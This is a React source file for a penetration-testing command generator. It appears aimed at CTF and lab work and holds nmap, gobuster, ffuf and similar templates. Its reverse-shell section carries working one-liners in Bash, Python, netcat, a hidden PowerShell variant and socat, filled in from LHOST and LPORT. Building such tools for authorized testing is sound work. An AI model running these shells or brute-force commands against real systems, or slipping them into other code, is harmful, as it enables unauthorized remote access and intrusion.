'use client';

import { useState, useEffect } from 'react';

// ── Types ──────────────────────────────────────────────────────────────────
type Command = { label: string; template: string };
type Tool = { id: string; name: string; description: string; commands: Command[]; phase: Phase };
type Phase = 'recon' | 'web' | 'fuzzing' | 'shells' | 'custom';
type Vars = { ip: string; lhost: string; lport: string; wordlist: string };

// ── Phases ─────────────────────────────────────────────────────────────────
const PHASES: { id: Phase; label: string; icon: string }[] = [
    { id: 'recon', label: 'Recon', icon: '◉' },
    { id: 'web', label: 'Web Enum', icon: '⬡' },
    { id: 'fuzzing', label: 'Fuzzing', icon: '⌬' },
    { id: 'shells', label: 'Reverse Shells', icon: '⚡' },
    { id: 'custom', label: 'Custom', icon: '✦' },
];

// ── Default Tools ──────────────────────────────────────────────────────────
const DEFAULT_TOOLS: Tool[] = [
    // RECON
    {
        id: 'nmap-basic', name: 'Nmap', phase: 'recon',
        description: 'Network scanner — discovers open ports, services, and OS fingerprints.',
        commands: [
            { label: 'Quick Scan', template: 'nmap <IP>' },
            { label: 'Service & Scripts', template: 'nmap -sC -sV -oN nmap_<IP>.txt <IP>' },
            { label: 'All Ports', template: 'nmap -p- --min-rate 5000 -oN nmap_full_<IP>.txt <IP>' },
            { label: 'UDP Top 20', template: 'nmap -sU --top-ports 20 <IP>' },
        ],
    },
    {
        id: 'rustscan', name: 'RustScan', phase: 'recon',
        description: 'Blazing-fast port scanner — finds open ports then hands off to Nmap.',
        commands: [
            { label: 'Fast Scan', template: 'rustscan -a <IP> -- -sC -sV' },
            { label: 'All Ports', template: 'rustscan -a <IP> -p- -- -sV' },
        ],
    },
    {
        id: 'subfinder', name: 'Subfinder', phase: 'recon',
        description: 'Passive subdomain discovery using public OSINT sources.',
        commands: [
            { label: 'Basic', template: 'subfinder -d <IP> -o subdomains.txt' },
            { label: 'With Sources', template: 'subfinder -d <IP> -v -o subdomains.txt' },
        ],
    },
    // WEB ENUM
    {
        id: 'gobuster', name: 'Gobuster', phase: 'web',
        description: 'Directory and DNS brute-forcer — finds hidden paths on web targets.',
        commands: [
            { label: 'Dir Scan', template: 'gobuster dir -u http://<IP> -w <WORDLIST> -o gobuster_<IP>.txt' },
            { label: 'DNS Brute', template: 'gobuster dns -d <IP> -w <WORDLIST>' },
            { label: 'VHOST', template: 'gobuster vhost -u http://<IP> -w <WORDLIST> --append-domain' },
        ],
    },
    {
        id: 'feroxbuster', name: 'Feroxbuster', phase: 'web',
        description: 'Recursive content discovery — great for deep directory trees.',
        commands: [
            { label: 'Recursive', template: 'feroxbuster -u http://<IP> -w <WORDLIST> -o ferox_<IP>.txt' },
            { label: 'Extensions', template: 'feroxbuster -u http://<IP> -w <WORDLIST> -x php,html,txt,bak' },
        ],
    },
    {
        id: 'nikto', name: 'Nikto', phase: 'web',
        description: 'Web server vulnerability scanner — checks for misconfigs and known CVEs.',
        commands: [
            { label: 'Basic', template: 'nikto -h http://<IP> -o nikto_<IP>.txt' },
            { label: 'With Port', template: 'nikto -h <IP> -p 8080' },
        ],
    },
    // FUZZING
    {
        id: 'ffuf', name: 'ffuf', phase: 'fuzzing',
        description: 'Fast web fuzzer — discovers endpoints, params, and virtual hosts.',
        commands: [
            { label: 'Dir Fuzz', template: 'ffuf -w <WORDLIST> -u http://<IP>/FUZZ -o ffuf_<IP>.json' },
            { label: 'VHOST Fuzz', template: 'ffuf -w <WORDLIST> -u http://<IP> -H "Host: FUZZ.<IP>" -fw 1' },
            { label: 'Param Fuzz', template: 'ffuf -w <WORDLIST> -u "http://<IP>/page?FUZZ=value"' },
            { label: 'POST Body', template: 'ffuf -w <WORDLIST> -X POST -d "username=FUZZ&password=test" -u http://<IP>/login' },
        ],
    },
    {
        id: 'wfuzz', name: 'wfuzz', phase: 'fuzzing',
        description: 'Classic web application fuzzer with extensive filter options.',
        commands: [
            { label: 'Dir Fuzz', template: 'wfuzz -c -z file,<WORDLIST> --hc 404 http://<IP>/FUZZ' },
            { label: 'Auth Bypass', template: 'wfuzz -c -z file,<WORDLIST> -d "user=FUZZ&pass=admin" http://<IP>/login' },
        ],
    },
    // REVERSE SHELLS
    {
        id: 'shell-bash', name: 'Bash', phase: 'shells',
        description: 'Classic Bash TCP reverse shell — works on most Linux targets.',
        commands: [
            { label: 'One-liner', template: 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' },
            { label: 'Encoded', template: 'echo "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1" | base64 | base64 -d | bash' },
        ],
    },
    {
        id: 'shell-python', name: 'Python', phase: 'shells',
        description: 'Python reverse shell — reliable on systems with Python installed.',
        commands: [
            { label: 'Python 3', template: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" },
            { label: 'Python 2', template: "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" },
        ],
    },
    {
        id: 'shell-nc', name: 'Netcat', phase: 'shells',
        description: 'Netcat reverse shells — multiple variants for different nc versions.',
        commands: [
            { label: 'nc -e', template: 'nc -e /bin/bash <LHOST> <LPORT>' },
            { label: 'nc mkfifo', template: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f' },
            { label: 'Listener', template: 'nc -lvnp <LPORT>' },
        ],
    },
    {
        id: 'shell-ps', name: 'PowerShell', phase: 'shells',
        description: 'Windows PowerShell reverse shell — for Windows targets.',
        commands: [
            { label: 'PS TCP', template: 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' },
        ],
    },
    {
        id: 'shell-socat', name: 'Socat', phase: 'shells',
        description: 'Socat shells — supports TTY upgrade for fully interactive shells.',
        commands: [
            { label: 'Basic', template: 'socat TCP:<LHOST>:<LPORT> EXEC:/bin/bash' },
            { label: 'TTY Shell', template: 'socat TCP:<LHOST>:<LPORT> EXEC:bash,pty,stderr,setsid,sigint,sane' },
            { label: 'Listener', template: 'socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>' },
        ],
    },
];

const STORAGE_KEY = 'toolkit-custom-tools';

// ── Main Component ─────────────────────────────────────────────────────────
export default function Toolkit() {
    const [activePhase, setActivePhase] = useState<Phase>('recon');
    const [vars, setVars] = useState<Vars>({ ip: '', lhost: '', lport: '', wordlist: '/usr/share/wordlists/dirb/common.txt' });
    const [customTools, setCustomTools] = useState<Tool[]>([]);
    const [isAdding, setIsAdding] = useState(false);
    const [copied, setCopied] = useState<string | null>(null);
    const [newTool, setNewTool] = useState({ name: '', description: '', commandLabel: '', commandTemplate: '' });

    // Load custom tools from localStorage
    useEffect(() => {
        try {
            const saved = localStorage.getItem(STORAGE_KEY);
            if (saved) setCustomTools(JSON.parse(saved));
        } catch { }
    }, []);

    // Save custom tools to localStorage whenever they change
    useEffect(() => {
        localStorage.setItem(STORAGE_KEY, JSON.stringify(customTools));
    }, [customTools]);

    const allTools = [...DEFAULT_TOOLS, ...customTools];
    const visibleTools = allTools.filter(t => t.phase === activePhase);

    const renderCommand = (template: string) => {
        return template
            .replace(/<IP>/g, vars.ip.trim() || '<IP>')
            .replace(/<LHOST>/g, vars.lhost.trim() || '<LHOST>')
            .replace(/<LPORT>/g, vars.lport.trim() || '<LPORT>')
            .replace(/<WORDLIST>/g, vars.wordlist.trim() || '<WORDLIST>');
    };

    const handleCopy = (id: string, text: string) => {
        navigator.clipboard.writeText(text);
        setCopied(id);
        setTimeout(() => setCopied(null), 1800);
    };

    const handleAddTool = (e: React.FormEvent) => {
        e.preventDefault();
        const tool: Tool = {
            id: Date.now().toString(),
            name: newTool.name,
            description: newTool.description,
            phase: 'custom',
            commands: [{ label: newTool.commandLabel, template: newTool.commandTemplate }],
        };
        setCustomTools(prev => [...prev, tool]);
        setNewTool({ name: '', description: '', commandLabel: '', commandTemplate: '' });
        setIsAdding(false);
        setActivePhase('custom');
    };

    const handleDeleteTool = (id: string) => {
        setCustomTools(prev => prev.filter(t => t.id !== id));
    };

    const isShellPhase = activePhase === 'shells';

    return (
        <div className="min-h-screen bg-[#0a0d12] text-slate-200 font-mono">

            {/* ── Scanline overlay ── */}
            <div className="pointer-events-none fixed inset-0 z-50" style={{
                backgroundImage: 'repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px)',
            }} />

            {/* ── Header ── */}
            <header className="border-b border-slate-800/60 bg-[#0a0d12]/80 backdrop-blur sticky top-0 z-40">
                <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
                    <div className="flex items-center gap-3">
                        <div className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                        <span className="text-emerald-400 font-bold text-lg tracking-[0.2em] uppercase">ToolKit</span>
                        <span className="text-slate-600 text-xs ml-2">// pentest command generator</span>
                    </div>
                    <div className="text-xs text-slate-600 hidden md:block">
                        {visibleTools.length} tool{visibleTools.length !== 1 ? 's' : ''} loaded
                    </div>
                </div>
            </header>

            <main className="max-w-7xl mx-auto px-6 py-8 space-y-6">

                {/* ── Variable Bar ── */}
                <div className="bg-slate-900/50 border border-slate-800 rounded-xl p-4">
                    <div className="text-xs text-slate-500 uppercase tracking-widest mb-3">Target Variables</div>
                    <div className="grid grid-cols-1 sm:grid-cols-2 xl:grid-cols-4 gap-3">
                        {[
                            { key: 'ip', label: 'TARGET IP', placeholder: '10.10.10.10', color: 'emerald' },
                            { key: 'lhost', label: 'LHOST', placeholder: '10.9.1.5 (your tun0)', color: 'cyan' },
                            { key: 'lport', label: 'LPORT', placeholder: '4444', color: 'cyan' },
                            { key: 'wordlist', label: 'WORDLIST', placeholder: '/usr/share/wordlists/...', color: 'violet' },
                        ].map(({ key, label, placeholder, color }) => (
                            <div key={key} className="relative">
                                <div className={`absolute left-3 top-1/2 -translate-y-1/2 text-xs font-bold text-${color}-500 pointer-events-none`}>
                                    {label} &gt;
                                </div>
                                <input
                                    type="text"
                                    placeholder={placeholder}
                                    value={vars[key as keyof Vars]}
                                    onChange={e => setVars(v => ({ ...v, [key]: e.target.value }))}
                                    className={`w-full bg-slate-950 border border-slate-700 text-${color}-300 rounded-lg py-3 text-sm focus:outline-none focus:border-${color}-500/50 transition-colors placeholder:text-slate-700`}
                                    style={{ paddingLeft: `${label.length * 7.5 + 24}px` }}
                                />
                            </div>
                        ))}
                    </div>
                </div>

                {/* ── Phase Tabs ── */}
                <div className="flex items-center gap-1 bg-slate-900/30 border border-slate-800 rounded-xl p-1.5 overflow-x-auto">
                    {PHASES.map(phase => (
                        <button
                            key={phase.id}
                            onClick={() => setActivePhase(phase.id)}
                            className={`flex items-center gap-2 px-4 py-2.5 rounded-lg text-sm font-medium whitespace-nowrap transition-all flex-1 justify-center ${activePhase === phase.id
                                ? 'bg-slate-800 text-emerald-400 border border-slate-700 shadow-lg shadow-black/30'
                                : 'text-slate-500 hover:text-slate-300 hover:bg-slate-800/40'
                                }`}
                        >
                            <span className={activePhase === phase.id ? 'text-emerald-400' : 'text-slate-600'}>
                                {phase.icon}
                            </span>
                            {phase.label}
                            {phase.id === 'custom' && customTools.length > 0 && (
                                <span className="ml-1 bg-emerald-500/20 text-emerald-400 text-xs px-1.5 py-0.5 rounded-full">
                                    {customTools.length}
                                </span>
                            )}
                        </button>
                    ))}
                </div>

                {/* ── Shell phase warning ── */}
                {isShellPhase && !vars.lhost && (
                    <div className="flex items-center gap-3 bg-amber-500/5 border border-amber-500/20 rounded-xl px-4 py-3 text-amber-400 text-sm">
                        <span>⚠</span>
                        <span>Set your <strong>LHOST</strong> and <strong>LPORT</strong> above to populate shell commands.</span>
                    </div>
                )}

                {/* ── Add Tool Form (Custom phase) ── */}
                {activePhase === 'custom' && (
                    <div>
                        {isAdding ? (
                            <form onSubmit={handleAddTool} className="bg-slate-900/60 border border-emerald-500/20 rounded-xl p-5 space-y-4">
                                <div className="text-sm text-emerald-400 font-semibold tracking-wide">// New Custom Tool</div>
                                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                                    <input required placeholder="Tool name (e.g. sqlmap)" value={newTool.name}
                                        onChange={e => setNewTool(p => ({ ...p, name: e.target.value }))}
                                        className="bg-slate-950 border border-slate-700 rounded-lg p-3 text-sm text-slate-200 placeholder:text-slate-600 focus:outline-none focus:border-slate-500" />
                                    <input required placeholder="Short description" value={newTool.description}
                                        onChange={e => setNewTool(p => ({ ...p, description: e.target.value }))}
                                        className="bg-slate-950 border border-slate-700 rounded-lg p-3 text-sm text-slate-200 placeholder:text-slate-600 focus:outline-none focus:border-slate-500" />
                                    <input required placeholder="Command label (e.g. Basic Scan)" value={newTool.commandLabel}
                                        onChange={e => setNewTool(p => ({ ...p, commandLabel: e.target.value }))}
                                        className="bg-slate-950 border border-slate-700 rounded-lg p-3 text-sm text-slate-200 placeholder:text-slate-600 focus:outline-none focus:border-slate-500" />
                                    <input required placeholder="Command template — use <IP> <LHOST> <LPORT> <WORDLIST>" value={newTool.commandTemplate}
                                        onChange={e => setNewTool(p => ({ ...p, commandTemplate: e.target.value }))}
                                        className="bg-slate-950 border border-slate-700 rounded-lg p-3 text-sm text-emerald-300 placeholder:text-slate-600 focus:outline-none focus:border-slate-500 font-mono" />
                                </div>
                                <div className="flex gap-3">
                                    <button type="submit" className="bg-emerald-600 hover:bg-emerald-500 text-white px-5 py-2 rounded-lg text-sm font-semibold transition-colors">
                                        Save Tool
                                    </button>
                                    <button type="button" onClick={() => setIsAdding(false)} className="bg-slate-800 hover:bg-slate-700 text-slate-300 px-5 py-2 rounded-lg text-sm transition-colors">
                                        Cancel
                                    </button>
                                </div>
                            </form>
                        ) : (
                            <button onClick={() => setIsAdding(true)}
                                className="w-full border border-dashed border-slate-700 hover:border-emerald-500/40 hover:bg-emerald-500/5 rounded-xl py-4 text-slate-500 hover:text-emerald-400 text-sm transition-all">
                                + Add custom tool
                            </button>
                        )}
                    </div>
                )}

                {/* ── Tools Grid ── */}
                {visibleTools.length === 0 && activePhase === 'custom' && !isAdding && (
                    <div className="text-center py-20 text-slate-600 text-sm">
                        No custom tools yet — add one above.
                    </div>
                )}

                <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-5">
                    {visibleTools.map(tool => (
                        <div key={tool.id} className="bg-slate-900/40 border border-slate-800 rounded-xl p-5 flex flex-col gap-4 hover:border-slate-700 transition-colors group">

                            {/* Tool header */}
                            <div className="flex items-start justify-between gap-2">
                                <div>
                                    <h2 className="text-cyan-400 font-bold text-lg">{tool.name}</h2>
                                    <p className="text-slate-500 text-xs mt-1 leading-relaxed">{tool.description}</p>
                                </div>
                                {tool.phase === 'custom' && (
                                    <button onClick={() => handleDeleteTool(tool.id)}
                                        className="text-slate-700 hover:text-red-400 text-xs transition-colors opacity-0 group-hover:opacity-100 shrink-0 mt-1">
                                        ✕
                                    </button>
                                )}
                            </div>

                            {/* Commands */}
                            <div className="space-y-3 flex-1">
                                {tool.commands.map((cmd, idx) => {
                                    const final = renderCommand(cmd.template);
                                    const copyId = `${tool.id}-${idx}`;
                                    const isCopied = copied === copyId;
                                    return (
                                        <div key={idx}>
                                            <div className="text-[10px] font-semibold text-slate-600 uppercase tracking-widest mb-1.5">
                                                {cmd.label}
                                            </div>
                                            <div className="flex items-stretch gap-2">
                                                <code className="flex-1 bg-slate-950 text-emerald-300 text-xs p-3 rounded-lg border border-slate-800 overflow-x-auto whitespace-nowrap block leading-relaxed">
                                                    {final}
                                                </code>
                                                <button
                                                    onClick={() => handleCopy(copyId, final)}
                                                    title="Copy"
                                                    className={`px-3 rounded-lg border text-xs font-semibold transition-all shrink-0 ${isCopied
                                                        ? 'bg-emerald-500/20 border-emerald-500/40 text-emerald-400'
                                                        : 'bg-slate-800 border-slate-700 text-slate-400 hover:text-slate-200 hover:bg-slate-700'
                                                        }`}
                                                >
                                                    {isCopied ? '✓' : '⧉'}
                                                </button>
                                            </div>
                                        </div>
                                    );
                                })}
                            </div>
                        </div>
                    ))}
                </div>
            </main>

            {/* ── Footer ── */}
            <footer className="border-t border-slate-800/40 mt-16 py-6 text-center text-slate-700 text-xs">
                toolkit // local command generator — variables inject on type
            </footer>
        </div>
    );
}